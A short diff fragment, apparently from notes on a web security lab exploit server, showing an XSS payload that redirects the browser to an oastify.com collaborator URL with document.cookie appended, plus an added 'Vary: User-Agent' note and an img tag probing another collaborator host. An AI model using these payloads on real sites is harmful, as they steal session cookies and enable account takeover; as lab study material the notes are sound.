@@ -77,5 +77,11 @@ X-Forwarded-Server: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net
 
 document.location='http://7ksammb8rmagtt67ea2b6r05ewkm8b.oastify.com/?cookies='+document.cookie;
 
+Vary: User-Agent
+
+```html
+<img src="http://7fnahm68mm5got179axb1rv59wfn3c.oastify.com/?agent" />
+```
+
 
 
